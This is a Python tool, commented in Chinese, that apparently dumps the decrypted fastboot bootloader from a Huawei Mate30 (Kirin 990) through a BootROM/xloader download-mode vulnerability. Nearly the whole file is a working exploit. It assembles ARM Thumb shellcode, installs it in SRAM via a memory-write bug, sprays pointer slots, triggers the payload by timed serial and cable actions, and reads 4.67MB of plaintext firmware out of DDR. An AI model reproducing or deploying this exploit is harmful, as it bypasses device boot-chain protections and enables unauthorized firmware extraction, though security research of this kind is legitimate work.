# -*- coding: utf-8 -*-
"""
readback_fastboot.py — Mate30 (Kirin 990 4G) fastboot 明文回读 · 交互式版
================================================================================
由实战验证的 readback_fb_dump.py（2026-09-06 v3 配置）重构而来：
协议时序、payload 汇编、触发方式逐字节保留，仅重做人机交互层，路径全部入 config.ini。

原理（详见 docs/05-xloader-arbitrary-read.md）:
  [BootROM] FRESH(07) → null 载荷（解密后）@0x22000 → 线缆舞步(TP4009 OFF 3s ON)
  [注入]    向 SRAM 0x5C400 安装回调 payload；DM 分发器把读指针 G_PTR 指向
            DDR 0x3A400000（fastboot 明文的物理驻留区），走 0x4EDC 慢速分支服务
  [触发]    关闭串口 3 秒重开（fb 配置沿用 close-3s 触发，与 xloader 版的
            纯静默触发不同——两个 proven 配置各自验证过，勿混用）
  [收割]    喂 sec_usb_xloader.img @0x22000 → 引导链把 fastboot 解密进 DDR →
            CD 应答按 4B/次送回 DDR 明文 → 存整盘 4.67MB fastboot 明文

成功判据（CD 应答前 4 字节）:
    0d000014  fastboot 向量表 SP → DDR 明文实锤
    7f454c46  ELF → 说明 G_PTR 仍落在 xloader 明文（SRAM）
    0000403a  DDR 自指针 → 亦是 DDR 明文实锤

用法:
    python readback_fastboot.py                # 按 config.ini 跑（首轮等设备 600s）
    python readback_fastboot.py --nowait       # 设备已就绪，等 30s 即可
    python readback_fastboot.py --rounds 10    # 最多重试轮数（默认 40）
    python readback_fastboot.py --config my.ini

依赖:
    pip install pyserial keystone-engine
    + 自备组件（见 README）: 官方 BD 固件包、null 载荷解密模块 kirin_loader.py
      （自备，不入本仓库）
"""
import argparse
import binascii
import configparser
import os
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from console_ui import make_ui

try:
    import serial
    import serial.tools.list_ports
except ImportError:
    print('缺少 pyserial: pip install pyserial')
    sys.exit(2)

ui = None

# ---------------------------------------------------------------- 协议常量（proven 实证值，勿改）
USB_VID, USB_PID = 0x12D1, 0x3609
CALLBACK = 0x5C400
G_PTR = 0x5C3FC
G_MARK = 0x5C3F8
DM_ADDR = 0x5C730
VT_ADDR = 0x5C800
INF_LOOP = 0x5C700
ENTRY = CALLBACK | 1
SPRAY = list(range(0x5D3B4, 0x5D3FC, 4))
FRESH_MARK = bytes.fromhex('1f000000')
ELF_MAGIC = bytes.fromhex('7f454c46')
ARM_MARK = bytes.fromhex('ccba11ca')
FB_VEC_SP = bytes.fromhex('0d000014')       # fastboot 向量表 SP（DDR 明文标志）
FB_SELF_PTR = bytes.fromhex('0000403a')     # DDR 自指针（同为明文标志）
FB_SIZE = 4673536                           # fastboot 明文总长 4.67MB
READ_WORDS = FB_SIZE // 4

STUB_LOG = 'readback_fastboot.log'


def log(m):
    ui.info(m)


def beep(f, ms):
    try:
        import winsound
        winsound.Beep(f, ms)
    except Exception:
        pass


# ---------------------------------------------------------------- 帧构造（逐字节一致）
def crc16(d):
    return binascii.crc_hqx(d, 0).to_bytes(2, 'big')


def head(addr, n, ft=1):
    h = struct.pack('>BBBBII', 0xFE, 0, 0xFF, ft, n, addr)
    return h + crc16(h)


def data(seq, p):
    d = struct.pack('>BBB', 0xDA, seq & 0xFF, (~seq) & 0xFF) + p
    return d + crc16(d)


def tail(seq):
    d = struct.pack('>BBB', 0xED, seq & 0xFF, (~seq) & 0xFF)
    return d + crc16(d)


def cdq(seq):
    c = struct.pack('>BBB', 0xCD, seq & 0xFF, (~seq) & 0xFF)
    return c + crc16(c)


# ---------------------------------------------------------------- payload（fb_dump proven 配置，勿改）
def build_payload():
    try:
        from keystone import Ks, KS_ARCH_ARM, KS_MODE_THUMB
    except ImportError:
        ui.error('缺少 keystone-engine: pip install keystone-engine')
        sys.exit(2)
    ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)

    CB = (
        "movw r0,#0xED08\nmovt r0,#0xE000\nmovw r1,#0xC800\nmovt r1,#5\nstr r1,[r0]\n"
        "movw r0,#0xEDFC\nmovt r0,#0xE000\nldr r1,[r0]\n"
        "movs r2,#1\nlsls r2,r2,#16\norrs r1,r1,r2\nstr r1,[r0]\n"
        "movw r0,#0x2008\nmovt r0,#0xE000\n"
        "movw r1,#0x0915\nmovt r1,#0x8000\nstr r1,[r0]\n"
        "movw r0,#0x200C\nmovt r0,#0xE000\n"
        "movw r1,#0x4EDD\nmovt r1,#0x4000\nstr r1,[r0]\n"
        "movw r0,#0x2000\nmovt r0,#0xE000\nmovs r1,#3\nstr r1,[r0]\n"
        "movw r0,#0x1E04\nmovt r0,#2\nmovw r1,#0xBACC\nmovt r1,#0xCA11\nstr r1,[r0]\n"
        "movs r0,#0\n"
        "movw r3,#0x959\nmovt r3,#0\nbx r3\n")
    cb_b = bytes(ks.asm(CB, CALLBACK)[0])

    # ★DM: G_PTR = 0x3A400000（DDR fastboot 明文物理地址）
    DM = (
        "mov r0, sp\n"
        "ldr r1,[r0,#24]\nbic r1,r1,#1\n"
        "movw r2,#0x916\ncmp r1,r2\nbne chk4edc\n"
        "mov r4, sp\n"
        "ldr r1,[r4]\n"
        "movw r2,#0x1E04\nmovt r2,#2\nstr r1,[r2]\n"
        "movw r1,#0xDECD\nmovt r1,#0xDECD\nstr r1,[r2]\n"
        "movw r2,#0xC3FC\nmovt r2,#5\nmovw r3,#0x0000\nmovt r3,#0x3A40\nstr r3,[r2]\n"
        "movw r3,#0x959\nstr r3,[r4,#16]\n"
        "movw r3,#0x6AD\nmovt r3,#0\nstr r3,[r4,#24]\n"
        "movw r2,#0x1E04\nmovt r2,#2\nmovw r1,#0x6AD6\nmovt r1,#0x6AD6\nstr r1,[r2]\n"
        "b chk4done\n"
        "chk4edc:\nmovw r2,#0x4EDC\ncmp r1,r2\nbne unknown\n"
        "movw r1,#0xC3FC\nmovt r1,#5\nldr r2,[r1]\n"
        "movw r3,#0x0000\nmovt r3,#0x3A40\ncmp r2,r3\nblo noop\n"
        "ldr r3,[r2]\nstr r3,[r0]\n"
        "adds r2,#4\nstr r2,[r1]\n"
        "noop:\nmovw r3,#0x4EE7\nstr r3,[r0,#24]\nbx lr\n"
        "unknown:\nmovw r3,#0x4EE7\nstr r3,[r0,#24]\n"
        "chk4done:\n"
        "bx lr\n")
    dm_b = bytes(ks.asm(DM, DM_ADDR)[0])
    inf_loop = bytes(ks.asm('b .\n', INF_LOOP)[0])

    blob = bytearray(VT_ADDR + 0x40 - CALLBACK)
    blob[0:len(cb_b)] = cb_b
    blob[INF_LOOP - CALLBACK:INF_LOOP - CALLBACK + len(inf_loop)] = inf_loop
    blob[DM_ADDR - CALLBACK:DM_ADDR - CALLBACK + len(dm_b)] = dm_b
    inf = INF_LOOP | 1
    dmv = DM_ADDR | 1
    vt = [0x5D3FC] + [inf] * 11 + [dmv, inf, inf, inf]
    for i, w in enumerate(vt):
        struct.pack_into('<I', blob, VT_ADDR - CALLBACK + 4 * i, w)
    return bytes(blob)


# ---------------------------------------------------------------- 串口层（与 xloader 版同源）
def find_port():
    try:
        for p in serial.tools.list_ports.comports():
            if p.vid == USB_VID and p.pid == USB_PID:
                return p.device
    except Exception:
        pass
    return None


def open_ser(port):
    try:
        s = serial.Serial(port, 115200, timeout=2, write_timeout=2, rtscts=True)
        s.dtr = True
        s.rts = True
        time.sleep(0.2)
        return s
    except Exception as e:
        ui.warn('打开 %s 失败: %s' % (port, e))
        return None


def wr(s, frame, nread=1, tmo=2.0):
    try:
        s.timeout = tmo
        s.write(frame)
        s.flush()
        return s.read(nread)
    except Exception:
        return b''


def drain(s):
    try:
        n = s.in_waiting
        if n:
            s.read(n)
    except Exception:
        pass


def session_start(s):
    raw = struct.pack('>BBBBII', 0xFE, 0, 0xFF, 1, 4, 0x22001)
    try:
        drain(s)
        s.timeout = 1.0
        s.write(raw + crc16(raw))
        s.flush()
        r = s.read(8)
        time.sleep(0.05)
        drain(s)
        return r
    except Exception:
        return b''


def cd_probe(s):
    return wr(s, cdq(1), 4, 2.0)


def wait_port(timeout_s, what='responsive port'):
    t0 = time.time()
    last = -99

    def poll():
        p = find_port()
        return '端口在位: %s' % p if p else '端口未出现'

    while time.time() - t0 < timeout_s:
        p = find_port()
        if p:
            try:
                s = serial.Serial(p, 115200, timeout=1.5, write_timeout=1, rtscts=True)
                s.dtr = True
                s.rts = True
                time.sleep(0.2)
                s.write(cdq(1))
                s.flush()
                r = s.read(8)
                s.close()
                if r:
                    return p
            except Exception:
                pass
        if time.time() - last > 15:
            ui.info('[等待] %s 未就绪 (%ds/%ds)' % (what, int(time.time() - t0), timeout_s))
            last = time.time()
        ui.countdown(what, min(10, timeout_s - (time.time() - t0)), poll=poll, tick=0.5)
    return None


def bug2_write(s, addr, val4, tries=3):
    for a in range(tries):
        drain(s)
        wr(s, head(0x22000, 4), 1, 2.0)
        time.sleep(0.05)
        wr(s, head(addr, 4), 0, 0.05)
        time.sleep(0.05)
        drain(s)
        r = wr(s, data(1, val4), 1, 2.0)
        if r and r[:1] == b'\xaa':
            return True
        time.sleep(0.2)
    return False


def upload_plain(s, blob, addr, name):
    ok = False
    for h in range(5):
        r = wr(s, head(addr, len(blob)), 1, 2.0)
        if r and r[:1] == b'\xaa':
            ok = True
            break
        ui.warn('%s head 重试 %d (应答 %s)' % (name, h + 1, r.hex() if r else 'none'))
        time.sleep(0.6)
    if not ok:
        ui.error('%s head 失败' % name)
        return False
    seq = 0
    off = 0
    bad = 0
    t0 = time.time()
    while off < len(blob):
        chunk = blob[off:off + 1024]
        seq += 1
        frame = data(seq, chunk)
        ack = wr(s, frame, 1, 2.0)
        if not ack or ack[:1] != b'\xaa':
            time.sleep(0.3)
            ack = wr(s, frame, 1, 2.0)
            if not ack or ack[:1] != b'\xaa':
                bad += 1
                if bad >= 5:
                    ui.error('%s 数据帧失败 @%d' % (name, off))
                    ui.progress_end()
                    return False
        off += len(chunk)
        rate = '%.0f B/s' % (off / max(time.time() - t0, 0.1))
        ui.progress(off, len(blob), label=name, rate=rate)
    wr(s, tail(seq + 1), 1, 2.0)
    ui.step(True, '%s 上传完成 (%d B)' % (name, len(blob)))
    return True


def fast_read(s, path, label):
    out = bytearray()
    got = 0
    bad = 0
    t0 = time.time()
    last_save = 0
    while got < READ_WORDS:
        try:
            s.write(cdq(1))
            s.flush()
        except Exception:
            ui.warn('%s: 串口写入异常' % label)
            break
        r = s.read(4)
        if len(r) < 4:
            bad += 1
            if bad > 12:
                ui.warn('%s: 连续无响应 @%d words，停止（已保存部分可离线用）' % (label, got))
                break
            time.sleep(0.5)
            continue
        bad = 0
        out += r[:4]
        got += 1
        rate = '%.0f w/s' % (got / max(time.time() - t0, 0.001))
        ui.progress(got, READ_WORDS, label=label, rate=rate)
        if got - last_save >= 4096:
            with open(path, 'wb') as f:
                f.write(bytes(out))
            last_save = got
    with open(path, 'wb') as f:
        f.write(bytes(out))
    ui.step(True, '%s: 已保存 %d 字节 -> %s' % (label, len(out), path))
    return bytes(out)


# ---------------------------------------------------------------- 主流程
def dance(s, port, round_no, null_blob):
    if not upload_plain(s, null_blob, 0x22000, 'null'):
        ui.error('R%d: null 下发失败' % round_no)
        return None
    ui.step(True, 'R%d: null 下发完成' % round_no)
    ui.warn('R%d: *** 请执行线缆舞步: TP4009 断开 3 秒后接通 ***' % round_no)
    beep(1200, 150)
    s.close()
    gone = False

    def poll_gone():
        return '端口仍在（等待断开 TP4009）' if find_port() else '端口已消失，等待回升'

    ui.countdown('等待端口消失', 120, poll=poll_gone, tick=1)
    gone = find_port() is None
    p = None
    if gone:
        ui.info('R%d: 端口已消失，等待回升...' % round_no)

        def poll_back():
            q = find_port()
            return '端口回升: %s' % q if q else '尚未回升'

        ui.countdown('等待端口回升', 300, poll=poll_back, tick=1)
        for _ in range(300):
            p = find_port()
            if p:
                break
            if _ % 2 == 0:
                beep(1500, 120)
            time.sleep(1)
        if p is None:
            ui.error('R%d: 端口未回升' % round_no)
            return None
    else:
        p = port
        ui.warn('R%d: 端口未消失——按"未断开"路径继续' % round_no)
    s = open_ser(p)
    if s is None:
        return None
    drain(s)
    ui.step(True, 'R%d: 舞步完成 @%s' % (round_no, p))
    beep(2000, 300)
    return s


def try_round(round_no, cfg, blob, null_blob, bdimg, nowait):
    port = wait_port(30 if (nowait or round_no > 1) else 600, 'responsive device')
    if not port:
        ui.error('R%d: 未发现可用设备' % round_no)
        return False
    ui.info('R%d: 串口 %s' % (round_no, port))
    s = open_ser(port)
    if s is None:
        return False
    drain(s)
    st = session_start(s)
    ui.info('R%d: session_start -> %s' % (round_no, st.hex() if st else '(none)'))
    r = cd_probe(s)
    fresh = (r == FRESH_MARK)
    ui.info('R%d: 状态 CD=%s -> %s' % (
        round_no, r.hex() if r else 'none',
        'FRESH（需要 null+舞步）' if fresh else '已舞步过'))
    if fresh:
        s2 = dance(s, port, round_no, null_blob)
        if s2 is None:
            return False
        s = s2

    # ---- 安装 payload（G_PTR 在安装时就直接指向 DDR 0x3A400000）----
    ok = False
    for attempt in range(3):
        good = True
        ui.info('R%d: 安装 payload（%d 字）' % (round_no, len(blob) // 4))
        for i in range(len(blob) // 4):
            c = bytes(blob[i * 4:i * 4 + 4])
            if not bug2_write(s, CALLBACK + i * 4, c):
                good = False
                ui.error('R%d: 安装失败 @word %d (0x%05X)' % (round_no, i, CALLBACK + i * 4))
                break
            ui.progress(i + 1, len(blob) // 4, label='install')
        if good and bug2_write(s, G_MARK, struct.pack('<I', 0xCA11BACC)) \
                and bug2_write(s, G_PTR, struct.pack('<I', 0x3A400000)):
            ok = True
            break
        ui.warn('R%d: 安装第 %d 遍失败——清缓冲重试' % (round_no, attempt + 1))
        drain(s)
        time.sleep(1)
    ui.progress_end()
    if not ok:
        ui.error('R%d: payload 安装失败' % round_no)
        s.close()
        return False
    ui.step(True, 'R%d: payload 已安装' % round_no)

    for slot in SPRAY:
        if not bug2_write(s, slot, struct.pack('<I', ENTRY)):
            ui.error('R%d: 喷涂失败 @0x%05X' % (round_no, slot))
            s.close()
            return False
    ui.step(True, 'R%d: 已喷涂 %d 个槽位' % (round_no, len(SPRAY)))

    # ---- 触发: 关串口 3 秒（fb proven 配置）----
    ui.info('R%d: 触发: 关闭串口 3 秒...' % round_no)
    s.close()
    time.sleep(3)
    s = None
    for i in range(6):
        s = open_ser(port)
        if s is not None:
            break
        time.sleep(1)
    if s is None:
        ui.error('R%d: 触发后无法重开串口' % round_no)
        return False
    drain(s)
    r = cd_probe(s)
    ran = (r == ARM_MARK)
    ui.info('R%d: 触发后 CD=%s（回调 %s）——按 04:18 先例继续' % (
        round_no, r.hex() if r else 'none', '已运行' if ran else '未标记'))

    # ---- 喂 BD xloader → 引导链把 fastboot 解密进 DDR ----
    if not upload_plain(s, bdimg, 0x22000, 'BD-xloader'):
        ui.error('R%d: BD 镜像下发失败' % round_no)
        s.close()
        return False
    ui.info('R%d: BD 已喂入——等待解密 + 端口重枚举...' % round_no)
    time.sleep(12)
    try:
        s.close()
    except Exception:
        pass

    # re-enum: 端口掉落时提示插拔（VBUS 事件），蜂鸣 4 声
    p = find_port()
    if not p:
        ui.warn('R%d: 端口已掉落 —— 请立刻插拔一次 USB 线（重枚举需要 VBUS 事件）' % round_no)
        for _ in range(4):
            beep(1400, 300)
    p = wait_port(240, 'post-decrypt recovery')
    if p is None:
        ui.error('R%d: 解密后端口丢失' % round_no)
        return False
    s = open_ser(p)
    if s is None:
        return False
    drain(s)
    ui.step(True, 'R%d: 端口已恢复 @%s' % (round_no, p))

    # ---- 探测 DDR 明文信号 ----
    got_plain = False
    for ip in range(24):
        r = cd_probe(s)
        if r and r[:1] != b'\x00':
            if r[:4] == FB_VEC_SP:
                sig = '<<< DDR fastboot 明文 (向量表 SP)!'
            elif r[:4] in (ELF_MAGIC, bytes.fromhex('02002800')):
                sig = '<<< xloader 明文!（G_PTR 落在 SRAM?）'
            elif r == ARM_MARK:
                sig = '(标记字)'
            else:
                sig = '(状态字)'
            ui.info('R%d: 探测 %d = %s %s' % (round_no, ip + 1, r.hex(), sig))
            if r[:4] == FB_VEC_SP:
                got_plain = True
                break
            if r[:4] in (ELF_MAGIC, bytes.fromhex('02002800')):
                got_plain = True
                break
        time.sleep(0.4)
    if not got_plain:
        ui.error('R%d: 未出现明文信号（DDR 里可能没有 fastboot）' % round_no)
        try:
            s.close()
        except Exception:
            pass
        return False
    ui.step(True, 'R%d: *** 明文服务中——开始收割 %d MB ***' % (round_no, FB_SIZE // 1024 // 1024))
    bd = fast_read(s, cfg['dump_path'], 'FB-DDR-read')
    try:
        s.close()
    except Exception:
        pass
    if bd[:4] == FB_VEC_SP:
        ui.step(True, 'R%d: *** FASTBOOT DDR 明文确认（向量表 SP）***' % round_no)
    elif bd[:4] == FB_SELF_PTR:
        ui.step(True, 'R%d: *** FASTBOOT DDR 明文确认（自指针）***' % round_no)
    elif bd[:4] == ELF_MAGIC:
        ui.warn('R%d: 收到的是 xloader 明文（G_PTR 未落在 DDR？）' % round_no)
    ui.info('R%d: %d 字节已保存 -> %s' % (round_no, len(bd), cfg['dump_path']))
    return True


def load_config(path):
    cp = configparser.ConfigParser()
    cp.read(path, encoding='utf-8')
    bd_dir = cp.get('paths', 'bd_dir', fallback='').strip()
    out_dir = cp.get('paths', 'out_dir', fallback='').strip() or os.getcwd()
    kirin_dir = cp.get('paths', 'kirin_module_dir', fallback='').strip()
    if not bd_dir:
        ui.error('config 未配置 [paths] bd_dir（官方 BD 包的 bootloaderimage 目录）')
        sys.exit(2)
    return {
        'bdimg': os.path.join(bd_dir, 'sec_usb_xloader.img'),
        'out_dir': out_dir,
        'kirin_dir': kirin_dir,
        'dump_path': os.path.join(out_dir, 'FASTBOOT_PLAIN.bin'),
    }


def load_null(kirin_dir):
    if not kirin_dir or not os.path.isdir(kirin_dir):
        ui.error('未配置 kirin_module_dir（null 载荷解密模块目录）')
        ui.error('该组件须自行获取，不随本仓库分发——见 README「自备组件」。')
        sys.exit(2)
    sys.path.insert(0, kirin_dir)
    try:
        import kirin_loader as K
    except ImportError as e:
        ui.error('在 %s 下找不到 kirin_loader.py: %s' % (kirin_dir, e))
        sys.exit(2)
    loader_dir = getattr(K, 'LOADER_DIR', kirin_dir)
    null = K.dtl(open(os.path.join(loader_dir, 'null.ktl'), 'rb').read())
    ui.step(True, 'null 载荷解密完成: %d B' % len(null))
    return null


def main():
    global ui
    ap = argparse.ArgumentParser(description='Mate30 fastboot 明文回读（交互式版）')
    ap.add_argument('--config', default=os.path.join(HERE, 'config.ini'))
    ap.add_argument('--nowait', action='store_true', help='设备已就绪: 首轮只等 30s')
    ap.add_argument('--rounds', type=int, default=40, help='最大重试轮数（默认 40）')
    a = ap.parse_args()

    if not os.path.exists(a.config):
        print('缺少配置文件 %s —— 请复制 config.example.ini 为 config.ini 并填写路径。' % a.config)
        return 2
    ui = make_ui(logfile=os.path.join(HERE, STUB_LOG))
    cfg = load_config(a.config)
    if not os.path.exists(cfg['bdimg']):
        ui.error('找不到 BD 镜像: %s' % cfg['bdimg'])
        return 2

    ui.banner('Mate30 fastboot 明文回读（fb_dump proven 配置重构版）')
    ui.info('BD 镜像 : %s' % cfg['bdimg'])
    ui.info('输出到  : %s' % cfg['dump_path'])
    ui.phase('准备 payload 与 null 载荷')
    blob = build_payload()
    ui.step(True, 'payload %d B 组装完成（DM 读指针 = DDR 0x3A400000）' % len(blob))
    null_blob = load_null(cfg['kirin_dir'])
    bdimg = open(cfg['bdimg'], 'rb').read()
    ui.step(True, 'BD 镜像读取: %d B' % len(bdimg))

    for rnd in range(1, a.rounds + 1):
        ui.phase('第 %d/%d 轮' % (rnd, a.rounds))
        try:
            if try_round(rnd, cfg, blob, null_blob, bdimg, a.nowait):
                ui.banner('=== 收割成功 ===')
                return 0
        except KeyboardInterrupt:
            ui.warn('用户中断——设备断电重进下载模式可恢复')
            return 130
        except Exception as e:
            ui.error('R%d 异常: %r' % (rnd, e))
        ui.info('第 %d 轮失败，5 秒后重试' % rnd)
        time.sleep(5)
    ui.error('=== 全部 %d 轮失败 ===' % a.rounds)
    return 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print('\n已中断')
        sys.exit(130)
